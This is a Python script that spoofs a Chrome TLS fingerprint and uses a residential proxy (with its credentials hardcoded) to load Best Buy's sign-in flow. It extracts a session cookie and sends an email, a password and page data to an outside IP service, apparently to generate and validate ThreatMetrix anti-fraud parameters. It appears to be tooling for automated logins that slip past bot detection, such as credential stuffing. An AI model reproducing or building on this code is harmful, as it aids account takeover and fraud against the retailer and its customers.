import tls_client
import requests
from resilient_caller import update_session_proxy
session = tls_client.Session(client_identifier='Chrome_112')
update_session_proxy(session, "residental.beyondproxy.io:12321:07834779:57811210_country-us")
session_new = requests.Session()
res = session.get("https://www.bestbuy.com/identity/global/signin")
head = res.headers['Location']
re = session.get(head)
zp = res.cookies['ZPLANK']
headers = {
    'Content-Type': 'application/json',
}
json_data1 = {
    "mail": "mail@gmail.com",
    "password": "htfygjk",
    "page": re.text,
}
print(json_data1)
res3 = session.post('http://64.112.97.148:9092/v1/tmx/parameters', json=json_data1)
print("parameter ="+res3.text+
      "\n")
json_data = {
    "location": head,
    "plank": zp,
    "proxy": "residental.beyondproxy.io:12321:07834779:57811210_country-us", #ip:port:user:pass
}

res2 = requests.post('http://64.112.97.148:9092/v1/tmx/validate', json=json_data)
print(res2.text)